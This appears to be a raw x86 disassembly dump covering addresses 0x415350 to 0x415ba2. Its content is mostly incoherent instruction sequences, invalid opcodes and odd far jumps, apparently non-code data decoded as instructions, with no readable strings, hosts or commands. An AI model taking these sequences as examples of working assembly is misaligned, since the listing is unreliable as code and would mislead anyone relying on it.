  415350:	outs   dx,BYTE PTR ds:[esi]
  415351:	arpl   WORD PTR [ecx+0x646d6cd9],bx
  415357:	xchg   edx,eax
  415358:	and    DWORD PTR [ecx+0x5e],esp
  41535b:	scas   eax,DWORD PTR es:[edi]
  41535c:	push   edx
  41535d:	arpl   di,si
  41535f:	sar    DWORD PTR [eax],1
  415361:	jno    0x4153ba
  415363:	mov    edx,0xc15d3f30
  415368:	imul   esi,DWORD PTR [eax+edx*1+0xc],0x4f
  41536d:	ins    DWORD PTR es:[edi],dx
  41536e:	inc    eax
  41536f:	mov    ch,0x6d
  415371:	ins    BYTE PTR es:[edi],dx
  415372:	pop    ebx
  415373:	call   DWORD PTR [edi]
  415375:	cs jmp 0x9405:0x1d612c0b
  41537d:	push   ebx
  41537e:	inc    ebp
  41537f:	push   ecx
  415380:	nop
  415381:	popa   
  415382:	push   cs
  415383:	pusha  
  415384:	shl    BYTE PTR [ebx],cl
	...
  415396:	add    BYTE PTR [eax],al
  415398:	inc    ecx
  415399:	xor    ah,BYTE PTR [eax-0x2af025b8]
  41539f:	adc    eax,ebx
  4153a1:	and    al,0x96
  4153a3:	ins    BYTE PTR es:[edi],dx
  4153a4:	or     al,0x61
  4153a6:	xchg   BYTE PTR [esi-0x15],dl
  4153a9:	and    al,0xb0
  4153ab:	sbb    edx,DWORD PTR ds:0xf010f108
  4153b1:	add    al,0xd
  4153b3:	add    al,0xc
  4153b5:	daa    
  4153b6:	out    0x3f,eax
  4153b8:	and    BYTE PTR [edi],ah
  4153ba:	add    DWORD PTR [eax+eiz*1],eax
  4153bd:	daa    
  4153be:	adc    DWORD PTR [esp+edx*8],eax
  4153c1:	pop    edi
  4153c2:	xor    esp,DWORD PTR [ebp-0x36]
  4153c5:	imul   edi,edx,0x11
  4153c8:	in     al,0x60
  4153ca:	cmp    esi,DWORD PTR [eax-0x6]
  4153cd:	inc    esi
  4153ce:	or     al,0x58
  4153d0:	in     eax,0x54
  4153d2:	adc    BYTE PTR [edx-0x57],al
  4153d5:	pop    esi
  4153d6:	or     eax,0x193e8869
  4153db:	imul   ebx,DWORD PTR [ecx-0x7196cafc],0x8868fa2f
  4153e5:	aas    
  4153e6:	add    eax,0xe7056159
  4153eb:	outs   dx,BYTE PTR ds:[esi]
  4153ec:	pop    esi
  4153ed:	pusha  
  4153ee:	sbb    dl,BYTE PTR [edx]
  4153f0:	adc    al,0x61
  4153f2:	retf   
  4153f3:	outs   dx,DWORD PTR ds:[esi]
  4153f4:	cli    
  4153f5:	xor    ebx,ebx
  4153f7:	inc    di
  4153f9:	push   ebp
  4153fa:	les    ebp,FWORD PTR [ebp+0x0]
	...
  41540d:	add    BYTE PTR [ebx],ch
  41540f:	push   ecx
  415410:	(bad)  
  415411:	push   ecx
  415412:	and    eax,0xfa03c45e
  415417:	arpl   WORD PTR [eax],ax
  415419:	int    0x4f
  41541b:	ss jo  0x4153de
  41541e:	or     BYTE PTR [ebx],dl
  415420:	lea    edx,cs:0xda80069
  415427:	imul   ebp,DWORD PTR [ebp-0x76],0xa863511e
  41542e:	pop    ds
  41542f:	popa   
  415430:	inc    edi
  415431:	xchg   edi,eax
  415432:	push   ss
  415433:	push   ecx
  415434:	mov    BYTE PTR [di],cl
  415437:	pop    esi
  415438:	jp     0x4153c6
  41543a:	sub    BYTE PTR [esi+0x64],bl
  41543d:	jmp    0x4aa4c0fa
  415442:	shl    DWORD PTR [eax],cl
  415444:	ins    DWORD PTR es:[edi],dx
  415445:	push   edx
  415446:	aad    0x66
  415448:	dec    ebx
  415449:	dec    esp
  41544a:	in     eax,0x62
  41544c:	arpl   WORD PTR [ebx-0x55],bx
  41544f:	ins    BYTE PTR es:[edi],dx
  415450:	addr16 cmp esi,edi
  415453:	ds jb  0x41549a
  415456:	aad    0x33
  415458:	addr16 dec ebp
  41545a:	inc    BYTE PTR [ebx+0x72]
  41545d:	inc    esp
  41545e:	mov    ds:0x951c6e41,al
  415463:	popa   
  415464:	jb     0x41546e
  415466:	ret    0x3f61
  415469:	jmp    0x5a4a728
  41546e:	mov    ah,0x52
  415470:	arpl   WORD PTR [eax+eax*1],cx
	...
  415483:	add    dh,bh
  415485:	inc    ebx
  415486:	jb     0x415488
  415488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415489:	push   eax
  41548a:	inc    ebp
  41548b:	or     al,0x52
  41548d:	cmp    BYTE PTR [ecx+0x4],dh
  415490:	dec    eax
  415491:	ds arpl ax,sp
  415494:	stc    
  415495:	inc    ebp
  415496:	jb     0x415478
  415498:	dec    ecx
  415499:	pop    ecx
  41549a:	inc    ebx
  41549b:	shr    DWORD PTR [ecx],1
  41549d:	bound  esi,QWORD PTR [edx-0x2b]
  4154a0:	inc    edx
  4154a1:	push   0x45d30077
  4154a6:	jb     0x415521
  4154a8:	cmp    DWORD PTR [esp+eax*2],0x65
  4154ac:	jo     0x4154ea
  4154ae:	jb     0x41551f
  4154b0:	push   0x3d
  4154b2:	popa   
  4154b3:	jns    0x415448
  4154b5:	inc    ebp
  4154b6:	jb     0x415531
  4154b8:	cmp    DWORD PTR [edx+edx*2],0x65
  4154bc:	jg     0x415529
  4154be:	pop    ebp
  4154bf:	jae    0x415537
  4154c1:	inc    ebp
  4154c2:	imul   ebp,DWORD PTR [esi+0x7],0x6b
  4154c6:	js     0x41553c
  4154c8:	xchg   ebx,eax
  4154c9:	push   ss
  4154ca:	popa   
  4154cb:	jbe    0x415453
  4154cd:	ss je  0x415524
  4154d0:	in     al,dx
  4154d1:	adc    al,0x61
  4154d3:	ins    BYTE PTR es:[edi],dx
  4154d4:	mov    ch,0x8
  4154d6:	dec    ebx
  4154d7:	jo     0x41548f
  4154d9:	bound  edx,QWORD PTR [eax+0x72]
  4154dc:	mov    esp,0xb0736165
  4154e1:	or     al,0x6b
  4154e3:	imul   esi,DWORD PTR [esi+0x490062],0x0
	...
  4154fa:	scas   al,BYTE PTR es:[edi]
  4154fb:	cmp    BYTE PTR [ecx+0x72],ah
  4154fe:	lock popa 
  415500:	outs   dx,BYTE PTR ds:[esi]
  415501:	popa   
  415502:	out    0x6b,eax
  415504:	dec    esp
  415505:	outs   dx,DWORD PTR ds:[esi]
  415506:	hlt    
  415507:	imul   esp,DWORD PTR [ecx+0x64],0x735162cc
  41550e:	push   es
  41550f:	aaa    
  415510:	add    BYTE PTR [edi-0xa],al
  415513:	sub    al,0x54
  415515:	outs   dx,DWORD PTR ds:[esi]
  415516:	call   0xed8ac386
  41551b:	push   0x6b
  41551d:	jb     0x41551d
  41551f:	addr16 je 0x41558b
  415522:	in     al,dx
  415523:	popa   
  415524:	add    BYTE PTR [ebx-0x34],al
  415527:	popa   
  415528:	jbe    0x41558f
  41552a:	sar    DWORD PTR [ebx],0x4f
  41552d:	imul   edi,edx,0x296d35c1
  415533:	mov    edx,0xc354674f
  415538:	xor    BYTE PTR [edi+0x56],ah
  41553b:	popf   
  41553c:	add    DWORD PTR [ebp+eiz*1-0x3d],ecx
  415540:	ins    BYTE PTR es:[edi],dx
  415541:	outs   dx,BYTE PTR ds:[esi]
  415542:	inc    edi
  415543:	(bad)  
  415544:	data16 jb 0x415582
  415547:	fimul  WORD PTR [ebp+0x6d]
  41554a:	or     eax,0x2a705677
  41554f:	jo     0x4155bb
  415551:	jbe    0x415576
  415553:	push   edx
  415554:	gs popw ds
  415557:	je     0x4155bb
  415559:	ins    BYTE PTR es:[edi],dx
  41555a:	pop    es
  41555b:	mov    DWORD PTR [edx+0x0],eax
	...
  41556e:	add    BYTE PTR [eax],al
  415570:	mov    ebx,0xe9736781
  415575:	pop    ecx
  415576:	xor    eax,0x6a40d16d
  41557b:	push   eax
  41557c:	call   0xe6a8a7b5
  415581:	inc    eax
  415582:	popa   
  415583:	arpl   cx,cx
  415585:	fld    QWORD PTR [ecx]
  415587:	popa   
  415588:	enter  0x5444,0x74
  41558c:	or     eax,edx
  41558e:	daa    
  41558f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  415591:	dec    ecx
  415592:	add    al,0x41
  415594:	xchg   edi,eax
  415595:	(bad)  
  415597:	dec    ebp
  415598:	stos   BYTE PTR es:[edi],al
  415599:	add    BYTE PTR [edx+0x51],ch
  41559c:	mov    ds:0xa7634fee,eax
  4155a1:	push   cs
  4155a2:	push   eax
  4155a3:	ins    DWORD PTR es:[edi],dx
  4155a4:	mov    BYTE PTR [eax],cl
  4155a6:	inc    ebx
  4155a7:	add    BYTE PTR [ecx-0x488baa00],bh
  4155ad:	add    ecx,DWORD PTR [edi+0x6b]
  4155b0:	cmp    DWORD PTR [ecx],eax
  4155b2:	push   esi
  4155b3:	je     0x415618
  4155b5:	or     ch,BYTE PTR [ebx+0x61]
  4155b8:	pop    ebx
  4155b9:	add    eax,0x3c6b60db
  4155be:	int    0x36
  4155c0:	dec    esi
  4155c1:	(bad)  
  4155c2:	fldenv [eax-0x6]
  4155c5:	inc    ebp
  4155c6:	les    edx,FWORD PTR [ebp+0x4e]
  4155c9:	inc    esi
  4155ca:	shr    DWORD PTR [edx+0x4b],cl
  4155cd:	push   0x57274f9a
  4155d2:	int3   
  4155d3:	add    eax,DWORD PTR [eax]
	...
  4155e5:	add    BYTE PTR [ebx],bh
  4155e7:	push   edi
  4155e8:	mov    al,0x53
  4155ea:	cs inc esp
  4155ec:	mov    dl,BYTE PTR [ecx+ebp*1+0x5c]
  4155f0:	cdq    
  4155f1:	pusha  
  4155f2:	cmp    ebp,DWORD PTR [eax-0x67]
  4155f5:	dec    edi
  4155f6:	adc    eax,0x2566806b
  4155fb:	pop    ecx
  4155fc:	mov    WORD PTR [ebx],?
  4155fe:	or     BYTE PTR [ebp+esi*2+0x64],bl
  415602:	out    dx,al
  415603:	addr16 mov ds:0xe560,al
  415607:	add    al,0xe7
  415609:	add    edi,edx
  41560b:	add    al,0xe7
  41560d:	add    edi,edx
  41560f:	add    al,0xe7
  415611:	add    edi,edx
  415613:	add    al,0xe7
  415615:	add    edi,edx
  415617:	add    al,0xe7
  415619:	add    edi,edx
  41561b:	add    al,0xe7
  41561d:	add    edi,edx
  41561f:	add    al,0xe7
  415621:	add    edi,edx
  415623:	add    al,0xe7
  415625:	add    edi,edx
  415627:	add    al,0xe7
  415629:	add    edi,edx
  41562b:	add    al,0xe7
  41562d:	add    edi,edx
  41562f:	add    al,0xe7
  415631:	add    edi,edx
  415633:	add    al,0xe7
  415635:	add    edi,edx
  415637:	add    al,0xe7
  415639:	add    edi,edx
  41563b:	add    al,0xe7
  41563d:	add    edi,edx
  41563f:	add    al,0xe7
  415641:	add    edi,edx
  415643:	add    al,0x0
  415645:	jmp    0xe9415b43
	...
  41565a:	add    BYTE PTR [eax],al
  41565c:	stc    
  41565d:	add    al,0x0
  41565f:	jmp    0xe9415b5d
  415664:	stc    
  415665:	add    al,0x0
  415667:	jmp    0xe9415b65
  41566c:	stc    
  41566d:	add    al,0x0
  41566f:	jmp    0xe9415b6d
  415674:	stc    
  415675:	add    al,0x0
  415677:	jmp    0xe9415b75
  41567c:	xor    DWORD PTR [eax],edi
  41567e:	inc    edi
  41567f:	lods   eax,DWORD PTR ds:[esi]
  415680:	stc    
  415681:	dec    ebx
  415682:	and    ebx,ecx
  415684:	icebp  
  415685:	sub    al,0x2b
  415687:	int3   
  415688:	jmp    0xdafdaea5
  41568d:	adc    al,0x34
  41568f:	mov    eax,ds:0xbb3025d2
  415694:	xor    DWORD PTR [esi],esp
  415696:	xor    BYTE PTR [ebx-0x46dce1cf],bh
  41569c:	cvtps2pi mm4,QWORD PTR [ebx]
  41569f:	sbb    DWORD PTR [ebp*1+0x2cec1923],eax
  4156a6:	and    ebx,DWORD PTR [ecx]
  4156a8:	in     al,0x2c
  4156aa:	and    ebx,DWORD PTR [ecx]
  4156ac:	in     al,dx
  4156ad:	sub    al,0x23
  4156af:	stc    
  4156b0:	out    0x2c,eax
  4156b2:	jnp    0x41569d
  4156b4:	mov    edx,0x99277465
  4156b9:	pop    eax
  4156ba:	addr16 aaa 
  4156bc:	lds    esi,FWORD PTR [ebx]
  4156be:	ja     0x4156da
	...
  4156d0:	add    BYTE PTR [eax],al
  4156d2:	retf   0x6b65
  4156d5:	xor    BYTE PTR [eax-0x61169296],ah
  4156db:	gs jb  0x4156dd
  4156de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156df:	pusha  
  4156e0:	xor    DWORD PTR [eax],eax
  4156e2:	inc    ecx
  4156e3:	sbb    esp,DWORD PTR [esp+ebp*2+0x7]
  4156e7:	or     DWORD PTR [ebp+0x73],eax
  4156ea:	or     al,0x5e
  4156ec:	jae    0x415724
  4156ee:	scas   eax,DWORD PTR es:[edi]
  4156ef:	adc    al,0x72
  4156f1:	outs   dx,DWORD PTR ds:[esi]
  4156f2:	mov    al,0x2f
  4156f4:	outs   dx,DWORD PTR ds:[esi]
  4156f5:	jae    0x4156da
  4156f7:	sbb    DWORD PTR [ebx+0x66],ebp
  4156fa:	scas   eax,DWORD PTR es:[edi]
  4156fb:	xor    eax,0x18be725d
  415700:	inc    esi
  415701:	popa   
  415702:	sbb    DWORD PTR [eax],0x656e6c50
  415708:	outs   dx,BYTE PTR gs:[esi]
  41570a:	jo     0x415724
  41570c:	inc    esi
  41570d:	push   esp
  41570e:	sbb    DWORD PTR [eax],0x48
  415711:	outs   dx,DWORD PTR ds:[esi]
  415712:	add    BYTE PTR [eax+0x6f],0x0
  415716:	push   eax
  415717:	pop    ebp
  415718:	data16 je 0x415787
  41571b:	arpl   WORD PTR [edx+0x65],si
  41571e:	push   edi
  41571f:	inc    esi
  415720:	pop    ebp
  415721:	jb     0x415764
  415723:	sbb    BYTE PTR [eax+0x6c],dl
  415726:	out    dx,al
  415727:	fs outs dx,BYTE PTR gs:[esi]
  41572a:	lock pop ss
  41572c:	inc    esi
  41572d:	push   esp
  41572e:	sbb    DWORD PTR [eax],0x48
  415731:	outs   dx,DWORD PTR ds:[esi]
  415732:	shl    BYTE PTR [edi+ebp*2],0x0
	...
  415746:	add    BYTE PTR [eax],al
  415748:	adc    BYTE PTR [esi+0x66],bl
  41574b:	je     0x4156f9
  41574d:	arpl   WORD PTR [edx+0x65],si
  415750:	pop    ss
  415751:	inc    ebx
  415752:	pop    ebp
  415753:	jb     0x41576c
  415755:	sbb    bl,BYTE PTR [ebp+0x76]
  415758:	mov    esi,0xc2694464
  41575d:	pop    esp
  41575e:	imul   esp,DWORD PTR [edi-0x25],0x5b
  415762:	outs   dx,DWORD PTR ds:[esi]
  415763:	je     0x415769
  415765:	aaa    
  415766:	jne    0x4157c4
  415768:	fst    QWORD PTR [eax+edx*2]
  41576b:	dec    eax
  41576c:	cli    
  41576d:	push   es
  41576e:	push   ebx
  41576f:	je     0x41576b
  415771:	or     ah,BYTE PTR [edi+0x66]
  415774:	xchg   dh,cl
  415776:	bound  esi,QWORD PTR [edx+0x5f]
  415779:	repnz inc ecx
  41577b:	pop    edi
  41577c:	push   0x5b51358c
  415781:	fcomp  DWORD PTR [esi+0x64]
  415784:	ss mov ch,0x62
  415787:	ins    BYTE PTR es:[edi],dx
  415788:	gs (bad) 
  41578a:	dec    ecx
  41578b:	addr16 dec ecx
  41578d:	mov    dl,0x68
  41578f:	jb     0x4157d4
  415791:	mov    ds:0x962a543f,al
  415796:	push   0x31de2e71
  41579b:	pop    edi
  41579c:	sub    DWORD PTR [ebx-0x35d792b0],ecx
  4157a2:	add    DWORD PTR [eax+0xd],ecx
  4157a5:	imul   ecx,DWORD PTR [ebp+0x4e],0x1b
  4157a9:	sbb    DWORD PTR [esi+0x0],0x0
	...
  4157bc:	add    BYTE PTR [eax],al
  4157be:	daa    
  4157bf:	imul   ebx,DWORD PTR [esi+0x72],0xfffffffa
  4157c3:	jno    0x41582f
  4157c5:	outs   dx,BYTE PTR ds:[esi]
  4157c6:	pop    ss
  4157c7:	ficom  WORD PTR [eax+0x61]
  4157ca:	repnz outs dx,BYTE PTR ds:[esi]
  4157cc:	pop    edi
  4157cd:	je     0x4157b9
  4157cf:	(bad)  
  4157d0:	push   0x6e
  4157d2:	rcr    ebp,cl
  4157d4:	xor    eax,0x3114b245
  4157d9:	dec    esp
  4157da:	mov    edi,0xdc47040b
  4157df:	sub    dl,BYTE PTR [eax+0x5f]
  4157e2:	(bad)  
  4157e3:	adc    DWORD PTR [eax+0x67],eax
  4157e6:	enter  0x3bdd,0x74
  4157ea:	stos   BYTE PTR es:[edi],al
  4157eb:	adc    al,0x66
  4157ed:	addr16 mov esp,0xfa63673c
  4157f3:	jmp    0x651e:0x4a66664
  4157fa:	mov    BYTE PTR [ecx+0x3b],ch
  4157fd:	aas    
  4157fe:	mov    ds:0x99681a5d,al
  415803:	push   edx
  415804:	sub    ebp,DWORD PTR [edi]
  415806:	xchg   ebp,eax
  415807:	pop    esi
  415808:	or     esp,DWORD PTR [edi+0x6f]
  41580b:	push   edx
  41580c:	mov    DWORD PTR [edx+0x5f],0x54650460
  415813:	imul   eax,DWORD PTR [edx+edx*2],0x5dd631fa
  41581a:	dec    esi
  41581b:	push   esi
  41581c:	enter  0x5951,0x31
  415820:	scas   al,BYTE PTR es:[edi]
  415821:	imul   eax,DWORD PTR [eax],0x0
	...
  415834:	pop    ebp
  415835:	push   edx
  415836:	mov    ebx,0x9b314860
  41583b:	cs fs retfw 
  41583f:	and    edi,DWORD PTR [ebx]
  415841:	pop    esi
  415842:	les    ebp,FWORD PTR [eax+0x45]
  415845:	pop    edi
  415846:	ret    
  415847:	pusha  
  415848:	sub    BYTE PTR ds:0x520a4cc3,al
  41584e:	xchg   esi,eax
  41584f:	ins    BYTE PTR es:[edi],dx
  415850:	push   es
  415851:	bound  edi,QWORD PTR [edi+0x3]
  415854:	sub    ebx,DWORD PTR [ebx+edx*4+0x60]
  415858:	or     esi,DWORD PTR [ecx]
  41585a:	out    0x37,eax
  41585c:	mov    ebp,0xd54e7a54
  415861:	pop    eax
  415862:	mov    ch,BYTE PTR [ebx-0x3a]
  415865:	xor    eax,0x38b4369a
  41586a:	aaa    
  41586b:	add    al,0xb6
  41586d:	push   ebp
  41586e:	push   eax
  41586f:	data16 sbb al,0x5c
  415872:	inc    ebp
  415873:	ins    DWORD PTR es:[edi],dx
  415874:	cli    
  415875:	push   ds
  415876:	inc    eax
  415877:	data16 aad 0x4
  41587a:	push   ds
  41587b:	xor    edx,edi
  41587d:	inc    esi
  41587e:	adc    esi,DWORD PTR [edx+edi*8]
  415881:	dec    eax
  415882:	add    BYTE PTR [eax],ah
  415884:	call   0xdc659c8d
  415889:	dec    eax
  41588a:	inc    edi
  41588b:	cmp    edi,esi
  41588d:	inc    ebx
  41588e:	push   ebx
  41588f:	xor    eax,0x395446bb
  415894:	(bad)  
  415895:	cmp    eax,0x2141
	...
  4158aa:	(bad)  
  4158ab:	push   ebx
  4158ac:	je     0x4158c4
  4158ae:	dec    eax
  4158af:	push   esi
  4158b0:	add    BYTE PTR [edx],bl
  4158b2:	push   ebp
  4158b3:	addr16 je 0x4158b4
  4158b6:	pop    esi
  4158b7:	push   ebx
  4158b8:	arpl   WORD PTR ds:0xcb6d611d,cx
  4158be:	pop    esi
  4158bf:	popa   
  4158c0:	push   ecx
  4158c1:	stos   BYTE PTR es:[edi],al
  4158c2:	ss xor eax,0x5238b543
  4158c8:	je     0x41588e
  4158ca:	(bad)  
  4158cb:	cmp    BYTE PTR [eax+0x9],dl
  4158ce:	add    al,0x25
  4158d0:	dec    eax
  4158d1:	into   
  4158d2:	and    ah,BYTE PTR [edx+0x5c]
  4158d5:	cwde   
  4158d6:	cmp    BYTE PTR [ecx],bh
  4158d8:	ins    DWORD PTR es:[edi],dx
  4158d9:	mov    esi,0x9b5f6315
  4158de:	stc    
  4158df:	xor    ebp,DWORD PTR [ebp-0x79]
  4158e2:	cmp    eax,0x1a9b5f58
  4158e7:	xor    DWORD PTR [ebp+0x7d],eax
  4158ea:	adc    al,0x63
  4158ec:	pop    edi
  4158ed:	xchg   ebp,eax
  4158ee:	sub    BYTE PTR [edi+edi*1-0x67],al
  4158f2:	mov    edx,0xb57c4130
  4158f7:	popa   
  4158f8:	inc    esi
  4158f9:	xchg   ebp,eax
  4158fa:	sub    DWORD PTR ds:0x530e0936,esp
  415900:	ins    DWORD PTR es:[edi],dx
  415901:	inc    edi
  415902:	lods   eax,DWORD PTR ds:[esi]
  415903:	push   ebx
  415904:	jno    0x415946
  415906:	fistp  WORD PTR [esi+0x5f]
  415909:	cmp    eax,0x413e02
	...
  41591e:	add    BYTE PTR [eax],al
  415920:	pop    ss
  415921:	push   0x61c16c6b
  415926:	jb     0x415928
  415928:	add    BYTE PTR [eax+0x66],ch
  41592b:	je     0x415911
  41592d:	popa   
  41592e:	jb     0x415995
  415930:	mov    edi,0x16f6c0f
  415935:	bound  ebp,QWORD PTR [ebx+edx*2-0x30]
  415939:	inc    ecx
  41593a:	push   eax
  41593b:	inc    ebp
  41593c:	iret   
  41593d:	inc    ebx
  41593e:	jno    0x4159b4
  415940:	push   es
  415941:	or     edx,DWORD PTR [eax+edx*2-0x3d]
  415945:	stc    
  415946:	pop    ds
  415947:	dec    eax
  415948:	cld    
  415949:	arpl   WORD PTR [ecx+0x5c],sp
  41594c:	add    al,BYTE PTR [esi+0x54]
  41594f:	outs   dx,DWORD PTR ds:[esi]
  415950:	lods   al,BYTE PTR ds:[esi]
  415951:	bound  esp,QWORD PTR fs:[ecx-0x4f]
  415955:	or     BYTE PTR [edi+0x6f],cl
  415958:	mov    ch,0x3c
  41595a:	jae    0x4159bd
  41595c:	mov    eax,ds:0xcf475c2b
  415961:	popa   
  415962:	bound  esp,QWORD PTR [ecx-0x41]
  415965:	adc    eax,0xb83413f
  41596a:	pop    esp
  41596b:	inc    ebx
  41596c:	data16 cmp al,0x61
  41596f:	inc    esi
  415970:	push   edi
  415971:	sbb    BYTE PTR [eax],ah
  415973:	aaa    
  415974:	ret    
  415975:	sbb    BYTE PTR [edx+0x6f],dh
  415978:	jne    0x4159a5
  41597a:	outs   dx,DWORD PTR ds:[esi]
  41597b:	jae    0x4159f7
  41597d:	popa   
  41597e:	outs   dx,BYTE PTR ds:[esi]
  41597f:	popa   
  415980:	(bad)  
  415981:	adc    al,0x4d
  415983:	inc    ebx
	...
  415994:	add    BYTE PTR [eax],al
  415996:	xchg   DWORD PTR [ecx+0x6b],esp
  415999:	ins    BYTE PTR es:[edi],dx
  41599a:	jno    0x415a03
  41599c:	jb     0x41599e
  41599e:	and    BYTE PTR [ecx+0x66],0x74
  4159a2:	mov    ah,0x67
  4159a4:	jb     0x415a0b
  4159a6:	(bad)  
  4159a8:	ins    BYTE PTR es:[edi],dx
  4159a9:	outs   dx,DWORD PTR ds:[esi]
  4159aa:	cli    
  4159ab:	aas    
  4159ac:	popa   
  4159ad:	ins    BYTE PTR es:[edi],dx
  4159ae:	test   eax,0xbf50411e
  4159b3:	and    DWORD PTR [edi],edi
  4159b5:	jae    0x41595d
  4159b7:	inc    eax
  4159b8:	ds push esp
  4159ba:	retf   0x1bfd
  4159bd:	and    BYTE PTR [edx-0x499c9af6],dh
  4159c3:	or     al,0x3f
  4159c5:	push   esp
  4159c6:	popf   
  4159c7:	cli    
  4159c8:	bound  ebx,QWORD PTR [bp+di+0x3ef]
  4159cd:	push   ecx
  4159ce:	lea    eax,[ebx]
  4159d0:	push   eax
  4159d1:	jne    0x415a2e
  4159d3:	rcr    BYTE PTR [esi+0x5c],1
  4159d6:	xor    eax,0x5b6262fa
  4159db:	add    ch,BYTE PTR [edi]
  4159dd:	inc    ecx
  4159de:	cmp    ebp,esi
  4159e0:	cmp    al,0x5c
  4159e2:	cmp    DWORD PTR [ecx-0x6dcb9cb3],ebp
  4159e8:	xor    DWORD PTR [eax],esp
  4159ea:	add    bh,dh
  4159ec:	xor    esi,DWORD PTR [edx+0x4d]
  4159ef:	les    ebx,FWORD PTR [esi+0x71]
  4159f2:	sub    DWORD PTR [ebp-0x45e4919c],esi
  4159f8:	xor    eax,0x4f
	...
  415a09:	add    BYTE PTR [eax],al
  415a0b:	add    BYTE PTR [ecx],bh
  415a0d:	push   0x64
  415a0f:	ins    DWORD PTR es:[edi],dx
  415a10:	push   cs
  415a11:	shl    BYTE PTR [edx+0x72],0xfa
  415a15:	sar    DWORD PTR [esp+ebp*2],0x1d
  415a19:	and    BYTE PTR [edx+0x6c],0x29
  415a1d:	lahf   
  415a1e:	inc    edx
  415a1f:	push   eax
  415a20:	aaa    
  415a21:	call   0x543b:0x78ee7340
  415a28:	retf   0x35dd
  415a2b:	inc    ebp
  415a2c:	(bad)  
  415a2d:	sbb    BYTE PTR [edi+0x5f],0xce
  415a31:	outs   dx,BYTE PTR ds:[esi]
  415a32:	inc    eax
  415a33:	aas    
  415a34:	stos   BYTE PTR es:[edi],al
  415a35:	add    al,0x2c
  415a37:	xor    BYTE PTR [ebx-0x4396acaf],bh
  415a3d:	xor    BYTE PTR [edi],dh
  415a3f:	and    al,0xaa
  415a41:	push   esi
  415a42:	ds add al,0xd6
  415a45:	inc    ebx
  415a46:	push   ebx
  415a47:	arpl   WORD PTR [eax-0x44c8b49b],bx
  415a4d:	inc    ebp
  415a4e:	pop    ss
  415a4f:	dec    ecx
  415a50:	mov    esi,0x99583447
  415a55:	inc    edx
  415a56:	cmp    esi,DWORD PTR [edx+ebx*8]
  415a59:	cmp    BYTE PTR [eax],dl
  415a5b:	pop    eax
  415a5c:	cdq    
  415a5d:	add    al,0x33
  415a5f:	inc    edi
  415a60:	mov    DWORD PTR [eax+0x4],edx
  415a63:	dec    edx
  415a64:	dec    esi
  415a65:	xor    eax,0x586b2fe7
  415a6a:	int    0x67
  415a6c:	inc    ebp
  415a6d:	push   ecx
  415a6e:	out    0x36,eax
	...
  415a80:	add    BYTE PTR [eax],al
  415a82:	dec    edi
  415a83:	arpl   bx,si
  415a85:	pop    edx
  415a86:	xor    eax,0x342fcc57
  415a8b:	pop    ecx
  415a8c:	enter  0x5256,0x43
  415a90:	scas   eax,DWORD PTR es:[edi]
  415a91:	xor    ebx,DWORD PTR [esi]
  415a93:	push   ss
  415a94:	out    0x36,eax
  415a96:	daa    
  415a97:	arpl   WORD PTR [ebx-0x3ba8b2a6],di
  415a9d:	das    
  415a9e:	cmp    al,0x59
  415aa0:	enter  0x1256,0x43
  415aa4:	(bad)  
  415aa5:	xor    edi,edx
  415aa7:	xor    eax,0x52066996
  415aac:	mov    BYTE PTR [ebp+0x19],dl
  415aaf:	sub    DWORD PTR [ebp+0x7f561d5f],ebp
  415ab5:	dec    ecx
  415ab6:	shl    BYTE PTR [ebx+eiz*4],cl
  415ab9:	pop    ss
  415aba:	cli    
  415abb:	cmp    ecx,DWORD PTR [ebp+0x63ee56]
  415ac1:	test   DWORD PTR [ebp-0x215a8d9b],edi
  415ac7:	push   eax
  415ac8:	push   0x6850d739
  415acd:	jmp    0x41b5847b
  415ad2:	test   BYTE PTR [ecx+0x6e],0x5a
  415ad6:	shr    BYTE PTR [ecx],cl
  415ad8:	ins    BYTE PTR es:[edi],dx
  415ad9:	push   ebp
  415ada:	(bad)  
  415adb:	xor    al,0x5f
  415add:	xor    eax,0x484404c6
  415ae2:	ret    0x4629
  415ae5:	add    BYTE PTR ds:[eax],al
	...
  415af8:	call   0x5128:0xf61b6360
  415aff:	adc    BYTE PTR [edx-0x6a388e9b],ah
  415b05:	sub    DWORD PTR [ecx+ebp*8+0x25],esi
  415b09:	cmp    dh,BYTE PTR [ebx+0x10]
  415b0c:	push   ebp
  415b0d:	pop    esp
  415b0e:	cs add eax,0x1500515f
  415b14:	push   ds
  415b15:	bound  esi,QWORD PTR [ecx-0xb]
  415b18:	pop    eax
  415b19:	push   edi
  415b1a:	ja     0x415b33
  415b1c:	bound  ebp,QWORD PTR [edx]
  415b1e:	je     0x415b09
  415b20:	adc    eax,0x24c86c43
  415b25:	pop    ebp
  415b26:	inc    esi
  415b27:	mov    cl,0xe9
  415b29:	sub    BYTE PTR [ecx],dh
  415b2b:	jmp    0xc8ad9e0d
  415b30:	dec    esp
  415b31:	pop    ebp
  415b32:	inc    esi
  415b33:	xchg   ecx,eax
  415b34:	jmp    0xe62a8f61
  415b39:	inc    edx
  415b3a:	addr16 xchg ebp,eax
  415b3c:	and    ch,BYTE PTR [edi]
  415b3e:	lea    esp,[di]
  415b41:	sub    al,BYTE PTR [eax]
  415b43:	mov    ch,0x24
  415b45:	bound  esi,QWORD PTR [esp+eax*4-0x26]
  415b49:	sub    DWORD PTR [esi+0x0],ebp
  415b4c:	sbb    BYTE PTR [esi+0x61],0x72
  415b50:	xor    eax,0x536c693d
  415b55:	sbb    DWORD PTR [edx+0x65],esi
  415b58:	sbb    BYTE PTR [esi+ebp*2+0x74],0x0
	...
  415b6d:	add    BYTE PTR [eax-0x41898d9f],dh
  415b73:	xor    ch,BYTE PTR [edi+0x2e]
  415b76:	stos   DWORD PTR es:[edi],eax
  415b77:	sub    DWORD PTR [eax+eax*1-0x19],ebp
  415b7b:	pop    esi
  415b7c:	gs ins BYTE PTR es:[edi],dx
  415b7e:	mov    esi,0xb76c653a
  415b83:	gs cs js 0x415b3d
  415b87:	add    BYTE PTR fs:[ebx-0x2c],dl
  415b8b:	pop    esi
  415b8c:	je     0x415c05
  415b8e:	add    dh,BYTE PTR [ebx]
  415b90:	popa   
  415b91:	pop    esp
  415b92:	(bad)  ds:0x2dc9656c
  415b98:	ins    BYTE PTR es:[edi],dx
  415b99:	ins    BYTE PTR es:[edi],dx
  415b9a:	add    al,BYTE PTR [ecx]
  415b9c:	dec    edi
  415b9d:	outs   dx,DWORD PTR ds:[esi]
  415b9e:	std    
  415b9f:	sub    al,0x73
  415ba1:	popa   
  415ba2:	loope  0x415c03
